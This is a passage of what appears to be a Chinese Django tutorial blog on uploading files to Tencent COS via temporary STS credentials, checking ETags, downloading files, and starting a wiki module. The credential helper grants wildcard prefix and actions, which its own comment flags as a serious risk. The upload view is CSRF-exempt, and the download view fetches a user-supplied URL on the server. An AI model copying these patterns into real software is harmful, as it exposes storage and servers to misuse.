class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">credential</span><span class="params">(bucket, region)</span>:</span></span><br><span class="line">    <span class="string">""" 获取临时凭证 """</span></span><br><span class="line">    <span class="comment"># 生成一个临时凭证，并返回前端</span></span><br><span class="line">    <span class="comment"># 1. 安装一个临时凭证python模块 pip install -U qcloud-python-sts</span></span><br><span class="line">    <span class="comment"># 2.写代码</span></span><br><span class="line">    <span class="keyword">from</span> sts.sts <span class="keyword">import</span> Sts</span><br><span class="line">    config = &#123;</span><br><span class="line">        <span class="comment"># 临时秘钥有效时长，单位是秒（30分钟=1800秒）</span></span><br><span class="line">        <span class="string">'duration_seconds'</span>: <span class="number">1800</span>,</span><br><span class="line">        <span class="comment"># 固定秘钥 id</span></span><br><span class="line">        <span class="string">'secret_id'</span>: settings.TENCENT_COS_ID,</span><br><span class="line">        <span class="comment"># 固定秘钥 key</span></span><br><span class="line">        <span class="string">'secret_key'</span>: settings.TENCENT_COS_KEY,</span><br><span class="line">        <span class="comment"># 换成你的 bucket</span></span><br><span class="line">        <span class="string">'bucket'</span>: bucket,</span><br><span class="line">        <span class="comment"># 换成 bucket 所在的地区</span></span><br><span class="line">        <span class="string">'region'</span>: region,</span><br><span class="line">        <span class="comment"># 允许的路径前缀，可以根据自己的网站用户登录状态判断允许上传的具体路径</span></span><br><span class="line">        <span class="comment"># 例子：a.jpg 或者 a/* 或者 * (使用通配符*存在重大的安全风险)</span></span><br><span class="line">        <span class="string">'allow_prefix'</span>: <span class="string">'*'</span>,</span><br><span class="line">        <span class="comment"># 秘钥的权限列表。简单的上传和分片需一下的权限，其他权限查看https://cloud.tencent.com/document/product/436/31923</span></span><br><span class="line">        <span class="string">'allow_actions'</span>: [</span><br><span class="line">            <span class="comment"># 简单上传操作</span></span><br><span class="line">            <span class="comment"># "name/cos:PutObject",</span></span><br><span class="line">            <span class="comment"># 表单上传对象</span></span><br><span class="line">            <span class="comment"># "name/cos:PostObject",</span></span><br><span class="line">            <span class="comment"># 分块上传：初始化分块操作</span></span><br><span class="line">            <span class="comment"># "name/cos:InitiateMultipartUpload",</span></span><br><span class="line">            <span class="comment"># 分块上传：List 进行中的分块上传</span></span><br><span class="line">            <span class="comment"># "name/cos:ListMultipartUploads",</span></span><br><span class="line">            <span class="comment"># 分块上传：List 已上传分块操作</span></span><br><span class="line">            <span class="comment"># "name/cos:ListParts",</span></span><br><span class="line">            <span class="comment"># 分块上传：上传分块块操作</span></span><br><span class="line">            <span class="comment"># "name/cos:UploadPart",</span></span><br><span class="line">            <span class="comment"># 分块上传：完成所有分块上传操作</span></span><br><span class="line">            <span class="comment"># "name/cos:CompleteMultipartUpload",</span></span><br><span class="line">            <span class="comment"># 取消分块上传操作</span></span><br><span class="line">            <span class="comment"># "name/cos:AbortMultipartUpload",</span></span><br><span class="line">            <span class="string">"*"</span>,</span><br><span class="line">        ],</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sts = Sts(config)</span><br><span class="line">    result_dict = sts.get_credential()</span><br><span class="line">    <span class="keyword">return</span> result_dict</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_bucket</span><span class="params">(bucket, region, file_object, key)</span>:</span></span><br><span class="line">    <span class="comment"># 将文件对象上传到当前项目的桶中</span></span><br><span class="line">    config = CosConfig(Region=region, SecretId=settings.TENCENT_COS_ID, SecretKey=settings.TENCENT_COS_KEY)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 获取客户端对象</span></span><br><span class="line">    client = CosS3Client(config)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 上传文件</span></span><br><span class="line">    response = client.upload_file_from_buffer(</span><br><span class="line">        Bucket=bucket,  <span class="comment"># 要上传桶的名称</span></span><br><span class="line">        Body=file_object,  <span class="comment"># 本地文件对象</span></span><br><span class="line">        Key=key,  <span class="comment"># 上传到桶之后的文件名</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"https://&#123;&#125;.cos.&#123;&#125;.myqcloud.com/&#123;&#125;"</span>.format(bucket, region, key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_file</span><span class="params">(bucket, region, key)</span>:</span></span><br><span class="line">    <span class="comment"># 校验上传文件的ETag</span></span><br><span class="line"></span><br><span class="line">    config = CosConfig(Region=region, SecretId=settings.TENCENT_COS_ID, SecretKey=settings.TENCENT_COS_KEY)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 获取客户端对象</span></span><br><span class="line">    client = CosS3Client(config)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对文件的ETag进行校验</span></span><br><span class="line">    data = client.head_object(</span><br><span class="line">        Bucket=bucket,  <span class="comment"># 桶的名称</span></span><br><span class="line">        Key=key,  <span class="comment"># 桶要的文件名</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><h4 id="11-7-4-form表单对临时凭证进行校验"><a href="#11-7-4-form表单对临时凭证进行校验" class="headerlink" title="11.7.4 form表单对临时凭证进行校验"></a>11.7.4 form表单对临时凭证进行校验</h4><p>上传文件的form表单写在file.py文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileModelForm</span><span class="params">(forms.ModelForm)</span>:</span></span><br><span class="line">    etag = forms.CharField(label=<span class="string">'ETag'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = models.FileRespository</span><br><span class="line">        exclude = [<span class="string">'project'</span>, <span class="string">'file_type'</span>, <span class="string">'update_user'</span>, <span class="string">'update_datetime'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        super().__init__(*args, **kwargs)</span><br><span class="line">        self.request = request</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clean_file_path</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"https://&#123;&#125;"</span>.format(self.cleaned_data[<span class="string">'file_path'</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clean</span><span class="params">(self)</span>:</span></span><br><span class="line">        key = self.cleaned_data[<span class="string">'key'</span>]</span><br><span class="line">        etag = self.cleaned_data[<span class="string">'etag'</span>]</span><br><span class="line">        size = self.cleaned_data[<span class="string">'file_size'</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> key <span class="keyword">or</span> <span class="keyword">not</span> etag:</span><br><span class="line">            <span class="keyword">return</span> self.cleaned_data</span><br><span class="line">        <span class="comment"># 向COS校验是否合法</span></span><br><span class="line">        <span class="comment"># SDK的功能</span></span><br><span class="line">        <span class="comment"># 如果上传的文件不存在会抛出CosServiceError异常</span></span><br><span class="line">        <span class="keyword">from</span> qcloud_cos.cos_exception <span class="keyword">import</span> CosServiceError</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = check_file(</span><br><span class="line">                bucket=self.request.tracer.project.bucket,</span><br><span class="line">                region=self.request.tracer.project.region,</span><br><span class="line">                key=key,</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">except</span> CosServiceError <span class="keyword">as</span> e:</span><br><span class="line">            self.add_error(<span class="string">'key'</span>,<span class="string">'文件不存在'</span>)</span><br><span class="line">            <span class="keyword">return</span> self.cleaned_data</span><br><span class="line"></span><br><span class="line">        cos_etag = result.get(<span class="string">'ETag'</span>)</span><br><span class="line">        <span class="keyword">if</span> etag != cos_etag:</span><br><span class="line">            self.add_error(<span class="string">'etag'</span>,<span class="string">'ETag错误'</span>)</span><br><span class="line"></span><br><span class="line">        cos_length = result.get(<span class="string">'Content-Length'</span>)</span><br><span class="line">        <span class="keyword">if</span> size != int(cos_length):</span><br><span class="line">            self.add_error(<span class="string">'size'</span>, <span class="string">'文件大小错误'</span>)</span><br></pre></td></tr></table></figure><h4 id="11-7-5-上传文件的视图函数"><a href="#11-7-5-上传文件的视图函数" class="headerlink" title="11.7.5 上传文件的视图函数"></a>11.7.5 上传文件的视图函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@csrf_exempt</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_post</span><span class="params">(request, project_id)</span>:</span></span><br><span class="line">    <span class="string">""" 将上传成功的文件写入到数据库 """</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    'name':fileName,</span></span><br><span class="line"><span class="string">    'key':key,</span></span><br><span class="line"><span class="string">    'file_size':fileSize,</span></span><br><span class="line"><span class="string">    'file_path':data.Location,</span></span><br><span class="line"><span class="string">    'parent':CURRENT_FOLDER_ID,</span></span><br><span class="line"><span class="string">    'etag':data.ETag,</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="comment"># print(request.POST)</span></span><br><span class="line">    <span class="comment"># 根据key再去cos获取ETag进行比较</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取数据写入到数据库中</span></span><br><span class="line">    form = FileModelForm(request, data=request.POST)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> form.is_valid():</span><br><span class="line">        <span class="comment"># 校验通过：数据写入数据库</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 通过ModelForm.save存储到的数据库中的数据返回的instance对象，无法通过get_xx_display获取choice到中文</span></span><br><span class="line">        <span class="comment"># form.instance.file_type = 1</span></span><br><span class="line">        <span class="comment"># form.update_user = request.tracer.user</span></span><br><span class="line">        <span class="comment"># instance = form.save()  # 添加成功之后，获取新添加的对象</span></span><br><span class="line"></span><br><span class="line">        data_dict = form.cleaned_data</span><br><span class="line">        data_dict.pop(<span class="string">'etag'</span>)</span><br><span class="line">        data_dict.update(&#123;<span class="string">'project'</span>: request.tracer.project, <span class="string">'file_type'</span>: <span class="number">1</span>, <span class="string">'update_user'</span>: request.tracer.user&#125;)</span><br><span class="line">        instance = models.FileRespository.objects.create(**data_dict)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 项目的已使用空间更新</span></span><br><span class="line">        request.tracer.project.use_space += data_dict[<span class="string">'file_size'</span>]</span><br><span class="line">        request.tracer.project.save()</span><br><span class="line"></span><br><span class="line">        result = &#123;</span><br><span class="line">            <span class="string">'id'</span>: instance.id,</span><br><span class="line">            <span class="string">'name'</span>: instance.name,</span><br><span class="line">            <span class="string">'file_size'</span>: instance.file_size,</span><br><span class="line">            <span class="string">'username'</span>: instance.update_user.username,</span><br><span class="line">            <span class="string">'datetime'</span>: instance.update_datetime.strftime(<span class="string">"%Y&#123;y&#125;-%m&#123;m&#125;-%d&#123;d&#125; %H:%M"</span>).format(y=<span class="string">'年'</span>, m=<span class="string">'月'</span>, d=<span class="string">'日'</span>),</span><br><span class="line">            <span class="string">'download_url'</span>: reverse(<span class="string">'file_download'</span>, kwargs=&#123;<span class="string">'project_id'</span>: project_id, <span class="string">'file_id'</span>: instance.id&#125;),</span><br><span class="line">            <span class="comment"># 'file_type':instance.get_file_type_display()</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">True</span>, <span class="string">'data'</span>: result&#125;)</span><br><span class="line">    <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">False</span>, <span class="string">'data'</span>: <span class="string">'文件错误'</span>&#125;)</span><br></pre></td></tr></table></figure><h3 id="11-8-下载文件"><a href="#11-8-下载文件" class="headerlink" title="11.8 下载文件"></a>11.8 下载文件</h3><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span><span class="params">(request)</span>:</span></span><br><span class="line"><span class="comment"># 打开开文件，获取文件内容</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'xxx.png'</span>,mode=<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    </span><br><span class="line">    response = HttpResponse(data)</span><br><span class="line">    <span class="comment"># 设置响应头</span></span><br><span class="line">    response[<span class="string">'Content-Disposition'</span>] = <span class="string">"attachment;filename=xxx.png"</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><h4 id="11-8-1-构造下载文件的url地址"><a href="#11-8-1-构造下载文件的url地址" class="headerlink" title="11.8.1 构造下载文件的url地址"></a>11.8.1 构造下载文件的url地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 项目管理</span></span><br><span class="line">url(<span class="string">r'^manage/(?P&lt;project_id&gt;\d+)/'</span>, include([</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 文件管理</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 临时秘钥</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 文件删除</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 上传文件</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 下载文件</span></span><br><span class="line">    url(<span class="string">r'^file/download/(?P&lt;file_id&gt;\d+)$'</span>, file.file_download, name=<span class="string">'file_download'</span>),</span><br><span class="line">], <span class="literal">None</span>, <span class="literal">None</span>)),</span><br></pre></td></tr></table></figure><h4 id="11-8-2-下载文件的视图函数"><a href="#11-8-2-下载文件的视图函数" class="headerlink" title="11.8.2 下载文件的视图函数"></a>11.8.2 下载文件的视图函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_download</span><span class="params">(request, project_id, file_id)</span>:</span></span><br><span class="line">    <span class="string">""" 下载文件 """</span></span><br><span class="line">    <span class="comment"># 文件内容</span></span><br><span class="line">    <span class="comment"># 响应头</span></span><br><span class="line">    <span class="comment"># 代开文件，获取文件内容;去cos获取文件内容</span></span><br><span class="line">    <span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">    file_obj = models.FileRespository.objects.filter(id=file_id, project=request.tracer.project).first()</span><br><span class="line">    res = requests.get(file_obj.file_path)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 文件分块处理（适用大文件）</span></span><br><span class="line">    data = res.iter_content()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置content_type="application/octet-stream" 用于提示下载弹框</span></span><br><span class="line">    response = HttpResponse(data,content_type=<span class="string">"application/octet-stream"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置响应头：中文文件名转义</span></span><br><span class="line">    <span class="keyword">from</span> django.utils.encoding <span class="keyword">import</span> escape_uri_path</span><br><span class="line">    response[<span class="string">'Content-Disposition'</span>] = <span class="string">"attachment;filename=&#123;&#125;"</span>.format(escape_uri_path(file_obj.name))</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 文件管理 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WiKi</title>
      <link href="/2020/08/02/10%20WiKi/"/>
      <url>/2020/08/02/10%20WiKi/</url>
      
        <content type="html"><![CDATA[<h2 id="10-WiKi"><a href="#10-WiKi" class="headerlink" title="10 WiKi"></a>10 WiKi</h2><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/wiki.jpg"  alt="wiki"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/wiki%E6%96%B0%E5%BB%BA.jpg"  alt="wiki新建"></p><h3 id="10-1表结构设置"><a href="#10-1表结构设置" class="headerlink" title="10 .1表结构设置"></a>10 .1表结构设置</h3><table><thead><tr><th>ID</th><th>标题</th><th>内容</th><th>项目ID</th><th>父ID</th><th>深度</th></tr></thead><tbody><tr><td>1</td><td>python</td><td>xxxx</td><td>1</td><td>null</td><td>1</td></tr><tr><td>2</td><td>django</td><td>xxxx</td><td>1</td><td>1</td><td>2</td></tr><tr><td>3</td><td>mysql</td><td>xxxx</td><td>2</td><td>null</td><td>1</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wiki</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    project = models.ForeignKey(verbose_name=<span class="string">'项目'</span>, to=<span class="string">'Project'</span>)</span><br><span class="line">    title = models.CharField(verbose_name=<span class="string">'标题'</span>, max_length=<span class="number">32</span>)</span><br><span class="line">    content = models.TextField(verbose_name=<span class="string">'内容'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 自关联   related_name反向关联字段，方便查找</span></span><br><span class="line">    parent = models.ForeignKey(verbose_name=<span class="string">'父文章'</span>, to=<span class="string">'Wiki'</span>, null=<span class="literal">True</span>, blank=<span class="literal">True</span>, related_name=<span class="string">'children'</span>)</span><br></pre></td></tr></table></figure><h3 id="10-2-构造url路径"><a href="#10-2-构造url路径" class="headerlink" title="10.2 构造url路径"></a>10.2 构造url路径</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 项目管理</span></span><br><span class="line">url(<span class="string">r'^manage/(?P&lt;project_id&gt;\d+)/'</span>, include([</span><br><span class="line">    <span class="comment"># wiki路径</span></span><br><span class="line">    url(<span class="string">r'^wiki/$'</span>, wiki.wiki, name=<span class="string">'wiki'</span>),</span><br><span class="line">], <span class="literal">None</span>, <span class="literal">None</span>)),</span><br></pre></td></tr></table></figure><h3 id="10-3-Wiki首页展示"><a href="#10-3-Wiki首页展示" class="headerlink" title="10.3 Wiki首页展示"></a>10.3 Wiki首页展示</h3><p>在templates文件夹下的manage文件夹下创建wiki.html文件存放wiki首页代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'layout/manage.html' %&#125;</span><br><span class="line">&#123;% load static %&#125;</span><br><span class="line">&#123;% block css %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.panel-default</span> &#123;</span></span><br><span class="line">            margin-top: 10px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.panel-default</span> <span class="selector-class">.panel-heading</span> &#123;</span></span><br><span class="line">            display: flex;</span><br><span class="line">            flex-direction: row;</span><br><span class="line">            justify-content: space-between;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.panel-body</span> &#123;</span></span><br><span class="line">            padding: 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.title-list</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">border-right</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#dddddd</span>;</span></span><br><span class="line">        &#123;# 右边框 1px 实体 灰色 #&#125; min-height: 500px;</span><br><span class="line">        &#123;# 最小高度500px #&#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.title-list</span> <span class="selector-tag">ul</span> &#123;</span></span><br><span class="line">            padding-left: 15px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.title-list</span> <span class="selector-tag">ul</span> <span class="selector-tag">a</span> &#123;</span></span><br><span class="line">            display: block;</span><br><span class="line">            padding: 5px 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.content</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">border-left</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#dddddd</span>;</span></span><br><span class="line">            min-height: 600px;</span><br><span class="line">            margin-left: -1px;</span><br><span class="line">        &#123;# 左边外边距移动1px #&#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container-fluid"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-book"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> wiki文档</span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'wiki_add' project_id=request.tracer.project.id %&#125;"</span> <span class="attr">type</span>=<span class="string">"button"</span></span></span><br><span class="line"><span class="tag">                       <span class="attr">class</span>=<span class="string">"btn btn-success btn-xs"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-plus-circle"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 新建</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    &#123;% if wiki_obj %&#125;</span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'wiki_edit' project_id=request.tracer.project.id wiki_id=wiki_obj.id %&#125;"</span></span></span><br><span class="line"><span class="tag">                           <span class="attr">type</span>=<span class="string">"button"</span></span></span><br><span class="line"><span class="tag">                           <span class="attr">class</span>=<span class="string">"btn btn-info btn-xs"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-edit"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 编辑</span><br><span class="line">                        <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'wiki_delete' project_id=request.tracer.project.id wiki_id=wiki_obj.id %&#125;"</span></span></span><br><span class="line"><span class="tag">                           <span class="attr">type</span>=<span class="string">"button"</span></span></span><br><span class="line"><span class="tag">                           <span class="attr">class</span>=<span class="string">"btn btn-danger btn-xs"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">i</span> <span 